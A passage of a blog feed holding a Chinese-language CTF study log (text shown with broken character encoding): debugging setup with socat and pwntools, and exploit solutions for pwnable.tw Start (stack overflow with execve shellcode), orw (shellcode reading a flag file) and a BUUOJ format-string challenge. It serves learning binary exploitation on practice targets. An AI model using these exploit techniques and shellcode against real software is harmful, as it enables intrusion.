class="keyword">function</span>(<span class="params">s</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> newres = s.<span class="title function_">toUpperCase</span>();        <span class="comment">//ä¿®æ”¹åŸå‡½æ•°çš„åŠŸèƒ½</span></span><br><span class="line">            <span class="keyword">return</span> newres;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>å› ä¸ºåˆšå­¦æ‰€ä»¥åªæœ‰åŸºç¡€çŸ¥è¯† ä»¥åæœ‰æ–°ä¸œè¥¿å†æ”¾ä¸Šæ¥</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Android</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnå­¦ä¹ è®°å½•</title>
    <url>/2024/05/22/Pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹å…¥é—¨Pwnçš„å¿ƒè·¯å†ç¨‹</p>
<span id="more"></span>

<h1 id="é›¶ç¢çŸ¥è¯†"><a href="#é›¶ç¢çŸ¥è¯†" class="headerlink" title="é›¶ç¢çŸ¥è¯†"></a>é›¶ç¢çŸ¥è¯†</h1><h2 id="æ ˆå¸§ç»“æ„"><a href="#æ ˆå¸§ç»“æ„" class="headerlink" title="æ ˆå¸§ç»“æ„"></a>æ ˆå¸§ç»“æ„</h2><p>åªæè¿°æ–¹ä¾¿æˆ‘è‡ªå·±ç†è§£çš„ ä¸ä¸€å®šæ ‡å‡†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high</span><br><span class="line"> â†‘</span><br><span class="line">     ...</span><br><span class="line">    Return Addr</span><br><span class="line">    Caller&#x27;s rbp</span><br><span class="line">    (Callee&#x27;s Registers)</span><br><span class="line">    Buf(Local variables)</span><br><span class="line">    ...</span><br><span class="line"> â†“</span><br><span class="line">low</span><br></pre></td></tr></table></figure>

<p><code>call func</code>æŒ‡ä»¤æ‰§è¡Œæ—¶ä¼šå…ˆå°†callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤pushå…¥æ ˆ é€€å‡ºå‡½æ•°æ—¶ä¿è¯å †æ ˆå¹³è¡¡å³rspæ¢å¤åˆ°è°ƒç”¨ç¨‹åºå‰ä¸€è¡Œçš„çŠ¶æ€ å‡½æ•°ç»“æŸå‰é€šè¿‡leaveæˆ–ç›´æ¥<code>add rsp, xxx</code>æ¥è¾¾åˆ°å †æ ˆå¹³è¡¡</p>
<h2 id="æŸ¥æ‰¾libc"><a href="#æŸ¥æ‰¾libc" class="headerlink" title="æŸ¥æ‰¾libc"></a>æŸ¥æ‰¾libc</h2><p>å¦‚æœèƒ½è”ç½‘åªæ¨èä½¿ç”¨<a href="https://libc.rip/">libc database</a></p>
<h2 id="GEFå¸¸ç”¨æŒ‡ä»¤"><a href="#GEFå¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="GEFå¸¸ç”¨æŒ‡ä»¤"></a>GEFå¸¸ç”¨æŒ‡ä»¤</h2><h3 id="telescope-dereference-register"><a href="#telescope-dereference-register" class="headerlink" title="telescope | dereference [register]"></a>telescope | dereference [register]</h3><p>é€’å½’åœ°è§£å¼•ç”¨æŸå¯„å­˜å™¨æ‰€å«åœ°å€</p>
<h3 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h3><p>pattern creat [lenth]</p>
<p>åˆ›å»ºé•¿åº¦ä¸ºlenthçš„è´Ÿè½½ è´Ÿè½½çš„å½¢å¼å¯ä»¥æ­é…ä¸‹ä¸€ä¸ªæŒ‡ä»¤è¿›è¡Œæ ˆæº¢å‡ºé•¿åº¦çš„è®¡ç®—</p>
<p>pattern search [register]</p>
<p>æŸ¥æ‰¾åˆ›å»ºçš„è´Ÿè½½ä¸­å“ª4&#x2F;8å­—èŠ‚(æ ¹æ®ç¨‹åºçš„å¹³å°)ä¸ç›®æ ‡å¯„å­˜å™¨ä¸­çš„ç›¸åŒ ä»¥æ­¤å¯ä»¥é€šè¿‡ä¼ å…¥<code>$rsp</code>è®¡ç®—æ ˆæº¢å‡ºé•¿åº¦</p>
<h2 id="IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•"><a href="#IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•" class="headerlink" title="IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•"></a>IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•</h2><p>å› ä¸ºæ­£å¸¸IDAå¯åŠ¨ç¨‹åºæ— æ³•è¾“å…¥ä¸å¯æ‰“å°å­—ç¬¦ æ‰€ä»¥éœ€è¦é…åˆpwntoolså‘é€æ•°æ® å®ç°è¿™ä¸ªåŠŸèƒ½çš„å…·ä½“æ­¥éª¤:</p>
<p>1.ç”¨socatè¿›è¡Œç«¯å£è½¬å‘</p>
<p><code>socat TCP-LISTEN:19961,reuseaddr,fork EXEC:./Program_to_debug,pty,raw,echo=0</code></p>
<p>æ‰§è¡ŒæŒ‡ä»¤å<code>Program_to_debug</code>ä¼šç«‹å³å¯åŠ¨å¹¶ç›‘å¬æœ¬æœº<code>19961</code>ç«¯å£</p>
<p>å†™ä¸€ä¸ªshellè„šæœ¬ç®€åŒ–ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 2 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;program&gt; &lt;port&gt;&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">port=<span class="variable">$2</span></span><br><span class="line">path=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">exec</span> socat TCP-LISTEN:<span class="variable">$port</span>,reuseaddr,fork EXEC:<span class="variable">$path</span>,pty,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>



<p>2.ç”¨pwntoolsé™„åŠ åˆ°ç¨‹åº</p>
<p>Pythonä¸­å¯¼å…¥pwnåä½¿ç”¨<code>io = remote(&#39;127.0.0.1&#39;, 19961)</code>æ¥å»ºç«‹å’Œç¨‹åºçš„é“¾æ¥ æ­¤æ—¶å¯ä»¥ä½¿ç”¨<code>io.send()</code>æ¥å‘é€æ•°æ®</p>
<p>3.ç”¨IDAé™„åŠ åˆ°ç¨‹åº</p>
<p><code>Debugger</code>é€‰é¡¹å¡ä¸­é€‰æ‹©è¿œç«¯è°ƒè¯•-&gt;é™„åŠ åˆ°ç¨‹åºå°±èƒ½çœ‹åˆ°åˆšåˆšå¯ç”¨çš„çš„å¾…è°ƒè¯•ç¨‹åº:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png" alt="image-20240528130639443"></p>
<p>æ³¨æ„äº‹é¡¹:</p>
<p>è¿è¡Œç¨‹åºå‰è¦å…ˆåœ¨æƒ³è¦åœä¸‹çš„åœ°æ–¹ä¸‹å¥½æ–­ç‚¹ è¿è¡Œèµ·æ¥åIDAç›´æ¥F9è¿è¡Œ è¿™æ—¶å€™ç¨‹åºä¼šè¿è¡Œåˆ°ç¬¬ä¸€ä¸ªè¾“å…¥å¤„ ä¸€èˆ¬åœ¨è¾“å…¥åä¸‹æ–­ç‚¹å¹¶åœ¨Pythonç»ˆç«¯ä¸­å‘ç¨‹åºå‘é€æ•°æ® å‘é€å®Œæ•°æ®åç¨‹åºå°±ä¼šæ–­åœ¨åˆšåˆšä¸‹å¥½çš„æ–­ç‚¹å¤„</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131047.png" alt="image-20240528131047508"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131106.png" alt="image-20240528131106868"></p>
<h3 id="å†ç®€åŒ–è„šæœ¬"><a href="#å†ç®€åŒ–è„šæœ¬" class="headerlink" title="å†ç®€åŒ–è„šæœ¬"></a>å†ç®€åŒ–è„šæœ¬</h3><p>å…¶ä¸­çš„<code>oport</code>å°±æ˜¯ä¸Šé¢ç¼–å†™çš„ç«¯å£è½¬å‘shellè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 2 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;program&gt; &lt;port&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">port=<span class="variable">$2</span></span><br><span class="line">path=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;./exp.py&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">touch</span> exp.py</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;from pwn import *\n\nelf = ELF(&#x27;<span class="variable">$path</span>&#x27;)\np = remote(&#x27;localhost&#x27;, <span class="variable">$port</span>)\ns       = lambda data               :p.send(data)\nsa      = lambda delim,data         :p.sendafter(delim, data)\nsl      = lambda data               :p.sendline(data)\nsla     = lambda delim,data         :p.sendlineafter(delim, data)\nr       = lambda num=4096           :p.recv(num)\nru      = lambda delims, drop=True  :p.recvuntil(delims, drop)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))\nuu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))\nleak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))\nl64     = lambda      :u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))\nl32     = lambda      :u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))\n\n\n\nitr()&quot;</span> &gt; exp.py</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> oport <span class="variable">$path</span> <span class="variable">$port</span></span><br></pre></td></tr></table></figure>



<h1 id="åˆ·é¢˜è®°å½•"><a href="#åˆ·é¢˜è®°å½•" class="headerlink" title="åˆ·é¢˜è®°å½•"></a>åˆ·é¢˜è®°å½•</h1><h2 id="Pwnable-tw-Start-stackoverflow-ret2shellcode"><a href="#Pwnable-tw-Start-stackoverflow-ret2shellcode" class="headerlink" title="Pwnable.tw-Start | stackoverflow | ret2shellcode"></a>Pwnable.tw-Start | stackoverflow | ret2shellcode</h2><p>é¢˜ç›®ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶å¾ˆç®€å• ç›´æ¥ç”¨ç³»ç»Ÿè°ƒç”¨æ¥è¾“å‡ºæç¤ºå’Œè¾“å…¥ ç„¶å<code>_exit</code>é€€å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048060 54                            push    esp</span><br><span class="line">.text:08048061 68 9D 80 04 08                push    offset _exit</span><br><span class="line">.text:08048066 31 C0                         xor     eax, eax</span><br><span class="line">.text:08048068 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:0804806A 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804806C 31 D2                         xor     edx, edx</span><br><span class="line">.text:0804806E 68 43 54 46 3A                push    3A465443h</span><br><span class="line">.text:08048073 68 74 68 65 20                push    20656874h</span><br><span class="line">.text:08048078 68 61 72 74 20                push    20747261h</span><br><span class="line">.text:0804807D 68 73 20 73 74                push    74732073h</span><br><span class="line">.text:08048082 68 4C 65 74 27                push    2774654Ch</span><br><span class="line">.text:08048087 89 E1                         mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 B2 14                         mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B B3 01                         mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D B0 04                         mov     al, 4</span><br><span class="line">.text:0804808F CD 80                         int     80h                             ; LINUX - sys_write</span><br><span class="line">.text:0804808F</span><br><span class="line">.text:08048091 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:08048093 B2 3C                         mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095 B0 03                         mov     al, 3</span><br><span class="line">.text:08048097 CD 80                         int     80h                             ; LINUX -</span><br><span class="line">.text:08048097</span><br><span class="line">.text:08048099 83 C4 14                      add     esp, 14h</span><br><span class="line">.text:0804809C C3                            retn</span><br><span class="line">.text:0804809C</span><br><span class="line">.text:0804809C                               _start endp ; sp-analysis failed</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; Attributes: noreturn</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; void exit(int status)</span><br><span class="line">.text:0804809D                               _exit proc near                         ; DATA XREF: _start+1â†‘o</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               status= dword ptr  4</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D 5C                            pop     esp</span><br><span class="line">.text:0804809E 31 C0                         xor     eax, eax</span><br><span class="line">.text:080480A0 40                            inc     eax</span><br><span class="line">.text:080480A1 CD 80                         int     80h</span><br></pre></td></tr></table></figure>

<p><code>checksec</code>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å…¨å…³ <code>vmmap</code>å‘ç°æ ˆå¯å†™å¯æ‰§è¡Œ ç”¨gdbè°ƒè¯•ä¸€ä¸‹å¯ä»¥å‘ç°æœ‰æ ˆæº¢å‡º<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png" alt="image-20240522194534063"></p>
<p>å¹¶ä¸”è¿”å›åœ°å€è·ç¦»è¾“å…¥ç¼“å†²åŒºèµ·ç‚¹20bytes å¯¹åº”<code>ret</code>å‰çš„<code>add esp, 0x14</code> ä½†æ˜¯ä¸€æ¬¡è¾“å…¥å³ä½¿ä¿®æ”¹è¿”å›åœ°å€ä¹Ÿæ²¡æœ‰ç°æˆçš„æ¼æ´å¯ä»¥åˆ©ç”¨ æ‰€ä»¥åˆ©ç”¨æ ˆå¯æ‰§è¡Œæ¥çœ‹çœ‹èƒ½ä¸èƒ½ret2shellcode æ€è·¯æ˜¯<code>ret</code>æŒ‡ä»¤æ‰§è¡ŒåespæŒ‡å‘è‡ªå·±å½“å‰çš„åœ°å€ è¿™æ—¶å€™å†è¿›è¡Œç³»ç»Ÿè°ƒç”¨å°±ä¼šæ³„éœ²espå†…å®¹ æ‰€ä»¥ç¬¬ä¸€ä¸ªpayloadå¯ä»¥è¿™æ ·å†™:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>]</span><br><span class="line">sh = process([<span class="string">&quot;./start&quot;</span>])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(ret)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>è‡³äºsendå’Œsendlineçš„åŒºåˆ«å€Ÿç”¨ä¸€ä¸‹è¿™ä½å¸ˆå‚…çš„<a href="https://zikh26.github.io/posts/9fda4edb.html?highlight=pwntools">è®²è§£</a> æ€»ä¹‹<code>sys-read</code>ä¼šå°†<code>\n</code>è¯»åˆ°æ ˆä¸Š æ‰€ä»¥ç”¨send</p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯è¿”å›åˆ°shellcodeä¸Š ä»<code>add esp, 0x14</code> å¯ä»¥çŸ¥é“è¿”å›åœ°å€è¿˜æ˜¯è·ç¦»ç¼“å†²åŒºèµ·ç‚¹20bytes è¿™æ„å‘³ç€shellcodeé•¿åº¦éœ€è¦åœ¨20bytesä»¥å†… å¯ä»¥åœ¨<a href="http://shell-storm.org/shellcode/index.html">è¿™ä¸ªç½‘ç«™</a>æ‰¾åˆé€‚çš„shellcodeæˆ–è€…ç­‰ä»¥åæˆ‘èƒ½åŠ›å¤Ÿäº†è‡ªå·±å†™( æ‰€ä»¥ç¬¬äºŒä¸ªpayloadå¯ä»¥è¿™æ ·å†™:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>æœ€åæ‹¿åˆ°flag</p>
<h2 id="Pwnable-tw-orw-shellcode"><a href="#Pwnable-tw-orw-shellcode" class="headerlink" title="Pwnable.tw-orw | shellcode"></a>Pwnable.tw-orw | shellcode</h2><p>é¢˜ç›®æè¿°åªèƒ½ä½¿ç”¨<code>open</code> <code>read</code> <code>write</code>ç³»ç»Ÿè°ƒç”¨ flagç›®å½•åœ¨<code>/home/orw/flag</code> ç¨‹åºæ²¡æœ‰å¯¹è¾“å…¥æœ‰ä»»ä½•è¿‡æ»¤ å¯¹è¾“å…¥çš„é•¿åº¦ä¹Ÿå‡ ä¹æ²¡æœ‰é™åˆ¶ å¯ä»¥ç›´æ¥ç”¨pwntoolsçš„shellcraftæ„é€ shellcode <a href="https://filippo.io/linux-syscall-table/">è¿™ä¸ªç½‘ç«™</a>å¯ä»¥æŸ¥åˆ°linuxç³»ç»Ÿè°ƒç”¨çº¦å®š</p>
<p>æŸ¥åˆ°<code>open</code>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„ ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯»å†™æ ‡å¿—ä½ è¿”å›çš„æ–‡ä»¶æŒ‡é’ˆæŒ‰ç…§i86è°ƒç”¨çº¦å®šå­˜æ”¾åœ¨<code>EAX</code>ä¸­ ç„¶åå†ç”¨<code>read</code>è¯»å–æ–‡ä»¶å¹¶å°†å…¶å­˜æ”¾åˆ°ä¸€ä¸ªç¼“å†²åŒºä¸­ æœ€åç”¨<code>write</code>æŒ‡å®šæ ‡å‡†è¾“å‡ºæµä¸ºæ–‡ä»¶æŒ‡é’ˆå°†ç¼“å†²åŒºçš„å†…å®¹å†™åˆ°è¾“å‡ºæµä¸­:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>, <span class="number">0</span>)    //ä»¥READ_ONLY(<span class="number">0</span>)æ ‡å¿—ä½æ‰“å¼€æ–‡ä»¶</span><br><span class="line">shellcode += shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)    //ä»¥espä½œä¸ºç¼“å†²åŒºæŒ‡é’ˆ è¯»å–<span class="number">100</span>å­—èŠ‚</span><br><span class="line">shellcode += shellcraft.i386.linux.write(<span class="number">1</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)        //<span class="number">1</span>ä¸ºæ ‡å‡†è¾“å‡ºæµ</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(sh.recv(<span class="number">100</span>))</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#BUUOJ-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="BUUOJ-[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>BUUOJ-[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p><code>checksec</code>å‘ç°å¼€äº†<code>NX</code>å’Œ<code>canary</code> å…³é—­äº†éšæœºç¡¬ä»¶åœ°å€ IDAæ‰“å¼€çœ‹çœ‹ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;random, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == random )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æµç¨‹ä¸ºç”¨éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆä¸€ä¸ªåŒå­—éšæœºæ•° ç„¶åè¾“å…¥ä¸¤ä¸ªå­—ç¬¦ä¸² è¾“å…¥nameåä¼šæœ‰å›æ˜¾ è¾“å…¥passwdåä¸ç”Ÿæˆçš„éšæœºæ•°å¯¹æ¯” ç›¸åŒçš„è¯å°±èƒ½æ‹¿åˆ°shell</p>
<p>è¾“å…¥çš„ä¸¤ä¸ªå­—ç¬¦ä¸²éƒ½ä¸è¶³ä»¥è¾¾åˆ°æ ˆæº¢å‡º è€Œä¸”è¿˜å¼€å¯äº†canaryé˜²æŠ¤ æ‰€ä»¥æ€è·¯ä»ret2textè½¬å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/03/20240603-232932.png" alt="image-20240603232924979"></p>
<p>éšæœºæ•°æ˜¯bssæ®µä¸Š<code>0x804C044~0x804C047</code>çš„ä¸€ä¸ªåŒå­—å†…å­˜ å› ä¸ºæ²¡æœ‰å¼€éšæœºç¡¬ä»¶åœ°å€ æ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨<code>%n</code>æ¥ä¿®æ”¹è¿™ä¸ªå€¼</p>
<h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹-å¾…è¡¥å……"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹-å¾…è¡¥å……" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹(å¾…è¡¥å……)"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹(å¾…è¡¥å……)</h3><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">printfæ³„éœ²æ ˆä¸Šçš„å†…å­˜çš„åŸç†</a> ä»¥ä¸‹ä»‹ç»ä¸¤ä¸ªå¸¸ç”¨çš„æ¼æ´åˆ©ç”¨æ‰‹æ®µ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;xxxxx%n&quot;</span>, p)        <span class="comment">//å‡è®¾%nå‰çš„&quot;xxxxx&quot;é•¿åº¦ä¸º m bytes pæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æŒ‡é’ˆ é‚£ä¹ˆprintfä¸ä¼šè¾“å‡º%næˆ–è€…p è€Œæ˜¯è¾“å‡º&quot;xxxxx&quot;å¹¶å°† m èµ‹ç»™*p</span></span><br><span class="line">                            <span class="comment">//é™¤æ­¤ä¹‹å¤–å¯ä»¥ç”¨%hn, %hhnæ¥åˆ†åˆ«å°†è¿™ä¸ªæŒ‡é’ˆè½¬åŒ–ä¸º(ä»¥32ä½ç¨‹åºä¸ºä¾‹): (_WORD *), (_BYTE *)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%[Num]$x&quot;</span>)            <span class="comment">//ä»¥%xçš„æ–¹å¼æ‰“å°æ ˆä¸Š&quot;%[A number]$x&quot;è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€åçš„ç¬¬Numä¸ªå†…å­˜å•å…ƒå‚¨å­˜çš„å†…å®¹</span></span><br><span class="line">                            <span class="comment">//ä¾‹å¦‚printf(&quot;%3$x&quot;, 0x10, 0x100, 0x200)ä¼šè¾“å‡º200</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%[Num]c&quot;</span>)            <span class="comment">//è¾“å‡ºNumä¸ªé‡å¤çš„å­—ç¬¦ é€šå¸¸ç”¨æ¥é…åˆ%nè¿›è¡ŒAAW</span></span><br></pre></td></tr></table></figure>

<p>äº†è§£äº†è¿™äº›åŸºç¡€çŸ¥è¯†å°±èƒ½åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²æ ˆä¸­çš„ä¿¡æ¯å¹¶ä¿®æ”¹å†…å­˜ äºæ˜¯ç¬¬ä¸€æ¬¡å‘é€payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + <span class="string">b&#x27;--&#x27;</span>.join([<span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;:%#x&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x10</span>)])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å›æ˜¾<code>b&#39;Hello,aaaa1:0xffbec598--2:0x63--3:0--4:0x3e8--5:0x3--6:0xf7fa3c08--7:0xffbec600--8:0xf7fa2ff4--9:0xc--10:0x61616161--11:0x23253a31--12:0x322d2d78--13:0x7823253a--\xf7your passwd:fail\n&#39;</code></p>
